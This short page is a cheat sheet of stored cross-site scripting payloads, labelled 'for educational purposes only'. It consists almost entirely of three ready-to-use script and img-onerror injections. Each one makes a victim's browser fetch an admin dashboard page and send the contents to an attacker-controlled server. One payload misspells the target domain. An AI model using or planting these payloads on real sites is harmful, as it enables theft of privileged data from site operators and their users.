<h1>Stored XSS To EXfiltrate Data - FOR EDUCATIONAL PURPOSES ONLY</h1>

make a user make a GET request and send the results to your attacker controlled server:

```<img src=x onerror="fetch('http://admin-dashboard.com/admin.html').then(r=>r.text()).then(d=>new Image().src='https://attacker-controlled-server.com/?param='+encodeURIComponent(d))">```

```<script>fetch('http://admin-dashbaoard.com/admin.html').then(r=>r.text()).then(data=>fetch('https://attacker-controlled-server.com/?param='+encodeURIComponent(data)))</script>```

```<script>fetch('http://admin-dashboard.com/admin.html').then(r=>r.text()).then(data=>{new Image().src='https://attacker-controlled-server.com/?param='+encodeURIComponent(data)})</script>```
